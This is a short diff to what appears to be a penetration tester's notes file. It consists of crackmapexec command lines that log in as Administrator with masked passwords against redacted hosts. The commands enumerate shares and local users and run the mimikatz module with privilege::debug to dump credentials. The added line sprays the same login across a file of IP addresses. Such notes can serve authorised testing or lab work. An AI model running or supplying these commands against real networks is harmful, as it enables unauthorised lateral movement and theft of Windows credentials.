@@ -5,3 +5,5 @@ crackmapexec X.X.X.139 -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP --shares 
 crackmapexec X.X.X.139 -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP -M mimikatz -o COMMAND=privilege::debug
 
 crackmapexec X.X.X.X -t 100 -u Administrator -p 'XxxxX' -d WORKGROUP --lusers --shares
+
+crackmapexec ip_new.txt -t 100 -u Administrator -p 'XXXXXX' -d WORKGROUP
